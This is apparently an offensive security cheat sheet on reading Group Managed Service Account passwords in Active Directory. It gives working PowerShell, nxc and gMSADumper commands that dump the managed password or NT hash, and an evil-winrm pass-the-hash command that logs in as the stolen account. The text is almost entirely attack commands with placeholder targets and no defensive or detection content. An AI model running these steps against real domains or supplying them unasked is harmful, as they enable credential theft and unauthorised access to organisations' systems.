# gMSA Password Read

Group Managed Service Accounts store passwords in `msDS-ManagedPassword`. Accounts in the designated reader group can dump them.

**From PowerShell (on-target):**
```powershell
$gmsa = Get-ADServiceAccount -Identity '<GMSA_ACCOUNT>' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp          # shows CurrentPassword (binary)
$pass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential '<DOMAIN>\<GMSA_ACCOUNT>$', $pass
# Use $cred for Invoke-Command / other calls
```

**From Linux with nxc:**
```bash
nxc ldap <DC> -u <USER> -p '<PASS>' --gmsa
```

**From Linux with gMSADumper:**
```bash
python3 gMSADumper.py -u '<USER>' -p '<PASS>' -d '<DOMAIN>'
# Returns NT hash for the gMSA account → use with PTH
```

After getting the NT hash, authenticate as the gMSA:
```bash
evil-winrm -i <TARGET> -u '<GMSA_ACCOUNT>$' -H <NTHASH>
```
